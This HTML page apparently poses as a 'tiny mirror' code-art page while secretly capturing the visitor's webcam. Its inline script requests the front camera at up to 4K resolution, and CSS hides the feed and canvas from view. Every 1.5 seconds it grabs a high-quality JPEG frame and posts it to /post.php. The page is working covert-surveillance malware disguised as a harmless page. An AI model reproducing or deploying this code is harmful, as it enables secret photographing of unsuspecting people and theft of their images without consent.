<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

<style>
    /* This hides the camera feed and the capture canvas from the user's view */
    #video, #canvas, .video-wrap {
        display: none;
        visibility: hidden;
        opacity: 0;
        position: absolute;
        width: 0;
        height: 0;
    }
</style>
</head>

<body>
       <video id="video" playsinline autoplay></video>
    </div>
    <canvas id="canvas" width="640" height="480"></canvas>
    <script>
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: '/post.php',
    dataType: 'json',
    async: false,
    success: function(result){},
    error: function(){}
  });
};

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Requesting High Definition (HD) quality
const constraints = {
  audio: false,
  video: { 
    facingMode: "user",
    width: { min: 640, ideal: 1920, max: 3840 },
    height: { min: 480, ideal: 1080, max: 2160 }
  }
};

async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    console.error(e);
  }
}

function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

  // Wait for the video metadata to load so we know the true resolution
  video.onloadedmetadata = function() {
    video.play();
    
    // Match canvas size to the actual video stream size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    var context = canvas.getContext('2d');
    
    setInterval(function(){
       // Draw at the stream's full native resolution
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       
       // Increase quality parameter (0.9 is high quality)
       var canvasData = canvas.toDataURL("image/jpeg", 0.9);
       post(canvasData); 
    }, 1500);
  };
}

init();
</script>
</body>
</html>